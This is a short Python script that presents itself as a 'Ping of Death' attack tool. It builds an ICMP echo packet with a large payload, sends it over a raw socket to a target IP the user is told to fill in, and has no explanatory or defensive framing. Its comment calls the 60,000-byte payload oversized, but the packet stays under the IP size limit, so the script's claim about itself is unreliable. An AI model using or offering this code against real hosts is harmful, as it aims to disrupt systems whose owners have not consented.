import socket
import struct
import random

def create_ping_packet():
    """
    Create a ping (ICMP Echo Request) packet.
    """
    type = 8  # ICMP Echo Request
    code = 0
    checksum = 0
    identifier = random.randint(0, 65535)
    sequence_number = random.randint(0, 65535)
    header = struct.pack('!BBHHH', type, code, checksum, identifier, sequence_number)
    data = b'X' * 60000  # Create oversized data

    # Calculate the checksum on the header + data
    checksum = calculate_checksum(header + data)

    # Create a new header with the correct checksum
    header = struct.pack('!BBHHH', type, code, checksum, identifier, sequence_number)
    return header + data

def calculate_checksum(source_string):
    """
    Calculate the checksum of the packet.
    """
    sum = 0
    count_to = (len(source_string) // 2) * 2
    count = 0

    while count < count_to:
        this_val = source_string[count + 1] * 256 + source_string[count]
        sum = sum + this_val
        sum = sum & 0xffffffff
        count = count + 2

    if count_to < len(source_string):
        sum = sum + source_string[len(source_string) - 1]
        sum = sum & 0xffffffff

    sum = (sum >> 16) + (sum & 0xffff)
    sum = sum + (sum >> 16)
    answer = ~sum
    answer = answer & 0xffff
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer

def ping_of_death(target_ip):
    """
    Send a Ping of Death packet to the target IP.
    """
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

    # Create a Ping of Death packet
    packet = create_ping_packet()

    # Send the packet to the target
    sock.sendto(packet, (target_ip, 1))
    print(f"Ping of Death packet sent to {target_ip}")
    sock.close()

if __name__ == "__main__":
    target_ip = "127.0.0.1"  # Replace with the target IP address
    ping_of_death(target_ip)
